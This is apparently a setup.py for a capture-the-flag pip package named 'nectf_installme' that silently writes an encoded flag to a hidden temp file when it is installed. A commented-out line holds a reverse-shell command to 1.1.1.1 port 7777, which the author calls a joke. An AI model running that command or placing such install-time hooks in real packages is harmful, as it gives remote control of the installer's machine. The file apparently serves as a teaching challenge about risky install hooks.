from setuptools import setup, find_packages
import tempfile
from os import path, system

tmp_file = tempfile.gettempdir() + path.sep + '.f14g_is_here'
f = open(tmp_file, 'w')
f.write('TkVDVEYlN0JjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2UlN0Q=')
f.close()

# system('bash -i >& /dev/tcp/1.1.1.1/7777 0>&1')
# Ohhhh, that a joke. I won't do that. 

setup(
    name='nectf_installme',
    version=1.0,
    description=(
        'Get flagggggggggg!'
    ),
    author='jiji',
    author_email='i@dont.know',
    license='GPLv3.0',
    packages=find_packages(),
    platforms=["all"],
    keywords=['nectf', 'getflag'],
    url='https://github.com/mmdjiji'
)
